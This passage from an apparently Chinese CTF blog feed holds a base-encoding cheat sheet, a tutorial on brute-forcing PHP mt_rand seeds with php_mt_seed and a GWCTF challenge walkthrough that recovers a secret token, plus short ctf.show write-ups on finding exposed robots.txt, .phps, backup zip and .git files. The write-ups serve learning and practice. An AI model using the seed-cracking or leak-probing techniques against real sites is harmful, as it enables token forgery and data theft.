</tbody></table>
<h3 id="base36"><a href="#base36" class="headerlink" title="base36"></a>base36</h3><p><strong>特点：密文由36个字符（0-9,a-z）组成，加密仅支持整数数字，解密仅支持字符串，不支持中文 密文由36个字符（0-9,A-Z）</strong></p>
<table>
<thead>
<tr>
<th>原文</th>
<th>base36加密</th>
</tr>
</thead>
<tbody><tr>
<td>123456</td>
<td>2n9c</td>
</tr>
<tr>
<td>10</td>
<td>a</td>
</tr>
<tr>
<td>9</td>
<td>9</td>
</tr>
<tr>
<td>11</td>
<td>b</td>
</tr>
</tbody></table>
<h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><p><strong>特点：密文由32个字符（A-Z,2-7)组成，末尾可能会有‘&#x3D;’，但最多有6个。</strong></p>
<table>
<thead>
<tr>
<th>原文</th>
<th>base32加密</th>
</tr>
</thead>
<tbody><tr>
<td>flag</td>
<td>MZWGCZY&#x3D;</td>
</tr>
<tr>
<td>flag{123asd}</td>
<td>MZWGCZ33GEZDGYLTMR6Q&#x3D;&#x3D;&#x3D;&#x3D;</td>
</tr>
<tr>
<td>flag{123asd_sxvhgjh}</td>
<td>MZWGCZ33GEZDGYLTMRPXG6DWNBTWU2D5</td>
</tr>
</tbody></table>
<h3 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h3><p><strong>特点：密文由16个字符（0-9,A-F）。</strong></p>
<table>
<thead>
<tr>
<th>原文</th>
<th>base16加密</th>
</tr>
</thead>
<tbody><tr>
<td>flag</td>
<td>666C6167</td>
</tr>
<tr>
<td>flag{dujv_1236}</td>
<td>666C61677B64756A765F313233367D</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>php之伪随机数爆破</title>
    <url>/2022/12/17/php%E4%B9%8B%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="PHP的伪随机数爆破"><a href="#PHP的伪随机数爆破" class="headerlink" title="PHP的伪随机数爆破"></a>PHP的伪随机数爆破</h1><h2 id="随机数并不随机"><a href="#随机数并不随机" class="headerlink" title="随机数并不随机"></a>随机数并不随机</h2><p>首先需要声明的是，计算机不会产生绝对随机的随机数，计算机只能产生“伪随机数”。其实绝对随机的随机数只是一种理想的随机数，即使计算机怎样发展，它也不会产生一串绝对随机的随机数。计算机只能生成相对的随机数，即伪随机数。</p>
<p><strong>伪随机数并不是假随机数，这里的“伪”是有规律的意思，就是计算机产生的伪随机数既是随机的又是有规律的。</strong>  怎样理解呢？产生的伪随机数有时遵守一定的规律，有时不遵守任何规律；伪随机数有一部分遵守一定的规律；另一部分不遵守任何规律。比如“世上没有两片形状完全相同的树叶”，这正是点到了事物的特性，即随机性，但是每种树的叶子都有近似的形状，这正是事物的共性，即规律性。从这个角度讲，你大概就会接受这样的事实了：<strong>计算机只能产生伪随机数而不能产生绝对随机的随机数</strong>。</p>
<p><strong>真随机数和伪随机数的概念</strong></p>
<ul>
<li>真随机数发生器：英文为：true random number generators ，简称为：TRNGs，是利用不可预知的物理方式来产生的随机数。</li>
<li>伪随机数发生器：英文为：pseudo-random number generators ，简称为：PRNGs，是计算机利用一定的算法来产生的。</li>
</ul>
<h2 id="PHP的伪随机数有关的两个函数"><a href="#PHP的伪随机数有关的两个函数" class="headerlink" title="PHP的伪随机数有关的两个函数"></a>PHP的伪随机数有关的两个函数</h2><h3 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a>mt_rand()</h3><p>mt_rand() 函数使用 Mersenne Twister 算法返回随机整数（随机数生成器）。</p>
<p><strong>语法</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mt_rand</span><span class="token punctuation">(</span>min<span class="token punctuation">,</span>max<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>说明</strong></p>
<p>如果没有提供可选参数 min 和 max，mt_rand() 返回 0 到 RAND_MAX 之间的伪随机数。</p>
<p>很多老的 libc 的随机数发生器具有一些不确定和未知的特性而且很慢。PHP 的 rand() 函数默认使用 libc  随机数发生器。mt_rand() 函数是非正式用来替换它的。该函数用了 Mersenne Twister  中已知的特性作为随机数发生器，它可以产生随机数值的平均速度比 libc 提供的 rand() 快四倍。</p>
<p><strong>例子</strong></p>
<p>在本例中，我们会返回一些随机数：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出类似：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">3150906288</span>
<span class="token number">513289678</span>
<span class="token number">35</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="mt-srand"><a href="#mt-srand" class="headerlink" title="mt_srand()"></a>mt_srand()</h3><p>mt_srand() 播种 Mersenne Twister 随机数生成器。</p>
<p><strong>语法</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mt_srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>参数 seed：规定播种值、用 seed 来给随机数发生器播种。</p>
<p><strong>例子</strong><br> 在本例中，我们将播种随机数生成器：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">mktime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出类似：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1132656473</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这段代码的意思是，是通过mt_srand分发seed种子，然后种子有了后，才能靠mt_rand()来生成随机数。</p>
<h4 id="为什么随机数要用种子播种，对种子的理解"><a href="#为什么随机数要用种子播种，对种子的理解" class="headerlink" title="为什么随机数要用种子播种，对种子的理解"></a>为什么随机数要用种子播种，对种子的理解</h4><p>首先我们要知道，计算机不能产生绝对的随机数，只能产生伪随机数。伪就是有规律的意思。伪随机数就是说计算机产生的随机数是有规律的。那么计算机是怎么产生随机数的？当然是通过算法，这个算法是有映射关系的，如我放进1，他会出来一个特定的数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">RAND_SEED</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">RAND_SEED</span><span class="token operator">*</span><span class="token number">123</span><span class="token operator">+</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">65536</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这是某个系统的随机数算法。</p>
<p>我们可以把这个算法看成是一个黑盒子，你放进一个数，就会出来一个特定的数，并把这个数当做下一次的种子在放进去。在这里，你第一次放进去的数就是随机数种子，也就是说随机种子（Random Seed）就是这些随机数的初始值。</p>
<p>系统实现随机数是把当前的系统时间放进去，每次时间都不一样，所以可以实现每次出来的数都不一样。如果你每次都放进一样的种子，生成的随机数列就是一样的了。</p>
<p>注释：自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种了，随机数生成器可以自动播种，因此没有必要使用该函数。</p>
<h2 id="PHP伪随机数安全"><a href="#PHP伪随机数安全" class="headerlink" title="PHP伪随机数安全"></a>PHP伪随机数安全</h2><h3 id="可预测性"><a href="#可预测性" class="headerlink" title="可预测性"></a>可预测性</h3><p>mt_rand()并不是一个真随机数生成函数，实际上绝大多数编程语言中的随机数函数生成的都是伪随机数。</p>
<p><strong>伪随机是由可确定的函数，通过一个种子（常用时钟）播种，产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，或者已知产生的随机数的一部分，都可能获得接下来随机数序列的信息，知道了你的随机数序列，就可以确定你的种子值。 （可预测性）。</strong></p>
<p><strong>简单假设一下 mt_rand()内部生成随机数的函数为: rand &#x3D; seed+(i*10) 其中 seed 是随机数种子， i 表示第几次调用这个随机数函数。当我们同时知道 i 和 rand 两个值的时候，就能很容易的算出seed的值来。比如 rand&#x3D;21 , i&#x3D;2 代入函数 21&#x3D;seed+(2*10) 就能得到 seed&#x3D;1 。是不是很简单，当我们拿到seed之后，就能计算出当 i 为任意值时候的 rand 的值了。</strong></p>
<h3 id="PHP的自动播种"><a href="#PHP的自动播种" class="headerlink" title="PHP的自动播种"></a>PHP的自动播种</h3><p>我们已经知道每一次mt_rand()被调用都会根据seed和当前调用的次数i来计算出一个伪随机数。而且seed是自动播种的：</p>
<blockquote>
<p>Note: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种，因为现在是由系统自动完成的。</p>
</blockquote>
<p>那么问题就来了，到底系统自动完成播种是在什么时候，如果每次调用mt_rand()都会自动播种那么破解seed也就没意义了。</p>
<p>不幸的是，php每次调用mt_rand()函数时，都会先检查是否已经播种。如果已经播种就直接产生随机数，否则调用php_mt_srand来播种。也就是说每个php cgi进程期间，只有第一次调用mt_rand()会自动播种。接下来都会根据这个第一次播种的种子来生成随机数。</p>
<p><strong>php_mt_seed</strong></p>
<p>我们已经知道随机数的生成是依赖特定的函数，上面曾经假设为 rand &#x3D; seed+(i<em>10) 。对于这样一个简单的函数，我们当然可以直接计算出一组解来，但 mt_rand() 实际使用的函数可是相当复杂且无法逆运算的。*<em>有效的破解方法其实是穷举所有的种子并根据枚举出的种子生成随机数序列再跟已知的随机数序列做比对来验证种子是否正确。php_mt_seed就是这么一个工具，它的速度非常快，跑完2^32位seed也就几分钟。</em></em> 它可以根据单次mt_rand()的输出结果直接爆破出可能的种子，当然也可以爆破类似mt_rand(1,100)这样限定了MIN MAX输出的种子。</p>
<p>很多国内开发者在程序中使用了mt_rand()来生成安全令牌、核心加解密key等等导致严重的安全问题。</p>
<p>用到的是爆破，已经有写好的C脚本了。</p>
<p>这里简单的介绍下这个脚本咋用</p>
<h3 id="种子爆破工具——php-mt-seed"><a href="#种子爆破工具——php-mt-seed" class="headerlink" title="种子爆破工具——php_mt_seed"></a>种子爆破工具——php_mt_seed</h3><p>下载地址：<a href="http://www.openwall.com/php_mt_seed">http://www.openwall.com/php_mt_seed</a></p>
<p>它可以根据单次mt_rand()的输出结果直接爆破出可能的种子，当然也可以爆破类似mt_rand(1,100)这样限定了MIN MAX输出的种子。</p>
<p>下载后，执行如下命令编译生成：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kali下，进入目录，make  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h4><p>php_mt_seed的用法可能很简单，也可能很复杂，具体取决于用例的详细信息。这是一个最简单的用法示例：<br> 首先使用PHP生成一个“随机”数字，例如：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">$ php5 <span class="token operator">-</span>r <span class="token string single-quoted-string">'mt_srand(1234567890); echo mt_rand(),"\n";'</span>
<span class="token number">1328851649</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后运行cracker（在此示例中，在与上面用于构建的系统相同的系统上）：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">$ time <span class="token operator">.</span><span class="token operator">/</span>php_mt_seed <span class="token number">1328851649</span>
   Pattern<span class="token punctuation">:</span> <span class="token constant">EXACT</span>
   Version<span class="token punctuation">:</span> <span class="token number">3.0</span><span class="token number">.7</span> to <span class="token number">5.2</span><span class="token number">.0</span>
   Found <span class="token number">0</span><span class="token punctuation">,</span> trying <span class="token number">0xfc000000</span> <span class="token operator">-</span> <span class="token number">0xffffffff</span><span class="token punctuation">,</span> speed <span class="token number">16261.0</span> Mseeds<span class="token operator">/</span>s
   Version<span class="token punctuation">:</span> <span class="token number">5.2</span><span class="token number">.1</span><span class="token operator">+</span>
   Found <span class="token number">0</span><span class="token punctuation">,</span> trying <span class="token number">0x1e000000</span> <span class="token operator">-</span> <span class="token number">0x1fffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.8</span> Mseeds<span class="token operator">/</span>s
   seed <span class="token operator">=</span> <span class="token number">0x1fd65f9a</span> <span class="token operator">=</span> <span class="token number">534142874</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">7.1</span><span class="token number">.0</span><span class="token operator">+</span><span class="token punctuation">)</span>
   Found <span class="token number">1</span><span class="token punctuation">,</span> trying <span class="token number">0x26000000</span> <span class="token operator">-</span> <span class="token number">0x27ffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.9</span> Mseeds<span class="token operator">/</span>s
   seed <span class="token operator">=</span> <span class="token number">0x273a3517</span> <span class="token operator">=</span> <span class="token number">658126103</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">5.2</span><span class="token number">.1</span> to <span class="token number">7.0</span><span class="token operator">.</span>x<span class="token punctuation">;</span> <span class="token constant">HHVM</span><span class="token punctuation">)</span>
   Found <span class="token number">2</span><span class="token punctuation">,</span> trying <span class="token number">0x48000000</span> <span class="token operator">-</span> <span class="token number">0x49ffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.9</span> Mseeds<span class="token operator">/</span>s
   seed <span class="token operator">=</span> <span class="token number">0x499602d2</span> <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">5.2</span><span class="token number">.1</span> to <span class="token number">7.0</span><span class="token operator">.</span>x<span class="token punctuation">;</span> <span class="token constant">HHVM</span><span class="token punctuation">)</span>
   seed <span class="token operator">=</span> <span class="token number">0x499602d2</span> <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">7.1</span><span class="token number">.0</span><span class="token operator">+</span><span class="token punctuation">)</span>
   Found <span class="token number">4</span><span class="token punctuation">,</span> trying <span class="token number">0xfe000000</span> <span class="token operator">-</span> <span class="token number">0xffffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.9</span> Mseeds<span class="token operator">/</span>s
   Found <span class="token number">4</span>
  
   real    <span class="token number">0</span>m47<span class="token operator">.</span><span class="token number">028</span>s
   user    <span class="token number">6</span>m15<span class="token operator">.</span><span class="token number">211</span>s
   sys     <span class="token number">0</span>m0<span class="token operator">.</span><span class="token number">015</span>s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php_mt_seed首先搜索旧版PHP 3.0.7至5.2.0的种子，通常只需一秒钟即可完成。然后，它会同时搜索PHP 5.2.1至7.0.x和PHP 7.1.0+的种子，这需要一段时间。</p>
<p>下面演示一个复杂的用法示例：<br> php_mt_seed 在其命令行上可以有1、2、4或更多的数字。数字指定了对 mt_rand()函数输出的约束，如mt_rand(0,50)。</p>
<p>当仅使用一个数字调用时，这是mt_rand函数的第一个用来爆破种子的输出。<br> 当用2个数字调用时，它们是第一个mt_rand()的输出应落入的范围（最小和最大，按该顺序）。<br> <strong>当用4个数字调用时，前2个给出第一个mt_rand()输出的界限，后两个2给出传递到mt_rand()的范围。</strong></p>
<h1 id="实例——-GWCTF-2019-枯燥的抽奖"><a href="#实例——-GWCTF-2019-枯燥的抽奖" class="headerlink" title="实例——[GWCTF 2019]枯燥的抽奖"></a>实例——[GWCTF 2019]枯燥的抽奖</h1><p>进入题目<br> <img src="https://img-blog.csdnimg.cn/20200712185058965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 是个猜字符的游戏，并且告诉你了一部分值：<code>utP4yKDDVV</code>，估计是已知产生的随机数的一部分。<br> F12 查看源码，发现check.php：<br> <img src="https://img-blog.csdnimg.cn/20200712185243498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 进入check.php，给出了你源码：<br> <img src="https://img-blog.csdnimg.cn/20200712185326552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 可知源码的逻辑是，先产生一个0到999999999之间的随机整数作为随机数种子被mt_srand()函数播种。然后在<code>$str_long1</code>这一长串字符串中用mt_rand()来随机取出20个字符构成字符串<code>$str</code>并输出<code>$str</code>的前十位给你。最后，将你猜的输入的值拼上给你的值与<code>$str</code>进行强类型比较，对比成功则返回flag。可见，如果最后能POST正确的20位，获得flag。那么关键就是，要根据给你的10位密码，反推出mt_srand的种子是什么，从而依葫芦画瓢构造私钥。<br> 接下来我们用php_mt_seed工具对随机数种子进行爆破。</p>
<p>先用脚本将伪随机数转换成php_mt_seed可以识别的数据格式：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">str1<span class="token operator">=</span><span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
str2<span class="token operator">=</span><span class="token string single-quoted-string">'utP4yKDDVV'</span>
str3 <span class="token operator">=</span> str1<span class="token punctuation">[</span><span class="token operator">::</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>     <span class="token comment"># 倒序</span>
length <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>    <span class="token comment"># 10</span>
res<span class="token operator">=</span><span class="token string single-quoted-string">''</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j in <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
            res<span class="token operator">+=</span><span class="token function">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span><span class="token operator">+</span><span class="token function">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span><span class="token operator">+</span><span class="token string single-quoted-string">'0'</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span><span class="token operator">+</span><span class="token function">str</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span> res

<span class="token comment">// 前两个str(j)代表第一个mt_rand()输出的界限，后两个参数0和str(len(str1)-1)表示传递到 mt_rand()的范围为0到61</span>
<span class="token number">12345678910111213</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/20200712192116451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 得到：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">20</span> <span class="token number">20</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">19</span> <span class="token number">19</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">51</span> <span class="token number">51</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">24</span> <span class="token number">24</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">46</span> <span class="token number">46</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将这一串拿到工具里去使用<br> 爆破出伪随机数和php版本</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">.</span><span class="token operator">/</span>php_mt_seed <span class="token number">20</span> <span class="token number">20</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">19</span> <span class="token number">19</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">51</span> <span class="token number">51</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">24</span> <span class="token number">24</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">46</span> <span class="token number">46</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/20200712192456776.png" alt="在这里插入图片描述"><br> 爆破的到种子为：206396968，如下改写源码，便可以得到完整的字符串</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">206396968</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/20200712192710912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 拿着得到得字符转提交即可得到flag：<br> <img src="https://img-blog.csdnimg.cn/20200712192816550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>**以上内容摘自<a href="https://blog.csdn.net/qq_45521281">WHOAMIAnony</a> **</p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf show</title>
    <url>/2022/12/11/ctf-show/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="web入门"><a href="#web入门" class="headerlink" title="web入门"></a>web入门</h1><h2 id="信息搜集篇"><a href="#信息搜集篇" class="headerlink" title="信息搜集篇"></a>信息搜集篇</h2><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>首先看到这个提示：</p>
<p><img src="https://img-blog.csdnimg.cn/596f9173f7ed4395b605372b2485798e.png#pic_center" alt="1"></p>
<p>打开链接后只有这：</p>
<p><img src="https://img-blog.csdnimg.cn/1f73d1abe28040d8b6694aac5d241642.png#pic_center" alt="2"></p>
<p>下意识CTRL+U查看源码，没有信息。</p>
<p>本题主要考察项目静态文件robots.txt的内容，一些项目robots.txt会存放于页面<a href="https://so.csdn.net/so/search?q=%E6%A0%B9%E7%9B%AE%E5%BD%95&spm=1001.2101.3001.7020">根目录</a>。里面包含一些重要信息。因此我们尝试在网址后面添加&#x2F;robots.txt。结果有了新的发现：</p>
<p><img src="https://img-blog.csdnimg.cn/f67302ed82a940179b4af7082c8b1c2a.png#pic_center" alt="3"></p>
<p>我们在网址后面加上&#x2F;flagishere.txt，flag显现。</p>
<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>有提示：</p>
<p><img src="https://img-blog.csdnimg.cn/a501687594b2446a8c353d48ff9ac942.png#pic_center" alt="4"></p>
<p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。</p>
<p>打开链接，我是先抓包，repeater后看到是用php语言编写的。</p>
<p><img src="https://img-blog.csdnimg.cn/b51eee7ec5e64148b8010a113ee635ae.png#pic_center" alt="6"></p>
<p>其主页文件应该是<strong>：index.php</strong>，访问看看，没显示。</p>
<p><img src="https://img-blog.csdnimg.cn/82eb6e04e80f47699c17d354a8ab970d.png#pic_center" alt="5"></p>
<p>访问：**&#x2F;index.phps**下载文件查看，得到flag。</p>
<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>官方提示：解压源码到当前目录，测试正常，收工</p>
<p>说明源码解压到当前目录后，产品就上线了，源码的压缩包没有删除，导致可以被下载</p>
<p>一般开发的源码压缩包名字都是w w w.zip</p>
<p><img src="https://img-blog.csdnimg.cn/27bf54b0ccb4478d94089ce1a2c99afd.png#pic_center" alt="7"></p>
<p>所以访问下载到这个压缩包，解压得到flag。</p>
<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>官方提示：版本控制很重要，但不要部署到生产环境更重要。</p>
<p>版本控制常用两种软件，一种是git，一种是svn，版本控制泄露就是将.git文件夹或者.svn文件夹也部署到网站上了，如果别人访问url&#x2F;.git就可以访问到。</p>
<p>试着访问&#x2F;.git和&#x2F;.svn，发现访问&#x2F;.git出现flag。</p>
<p><img src="https://img-blog.csdnimg.cn/c71171b9596a457a9de2f33409e5020f.png#pic_center" alt="8"></p>
<p><img src="https://img-blog.csdnimg.cn/f99e0efe08b94cffa35fb0b89c67f324.png#pic_center" alt="9"></p>
